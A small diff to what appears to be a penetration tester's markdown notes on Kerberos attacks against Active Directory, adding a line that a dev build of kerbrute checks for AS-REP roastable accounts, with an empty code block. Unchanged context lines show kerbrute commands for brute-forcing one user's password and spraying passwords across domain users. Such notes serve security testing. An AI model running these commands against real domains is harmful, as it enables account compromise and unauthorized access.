@@ -17,6 +17,11 @@ kerbrute bruteuser --dc $TARGET_IP -d $TARGET_AD -t 100 -v passwords $USER
 kerbrute passwordspray --dc $TARGET_IP -d $TARGET_AD users -t 100 -v --user-as-pass
 ```
 
+Dev version of kerbrute auto-checks for AS-REP Roastable accounts
+```bash
+
+```
+
 AS-REP Roasting
 ---
 #as-rep-roasting #kerberos #asrep-roasting
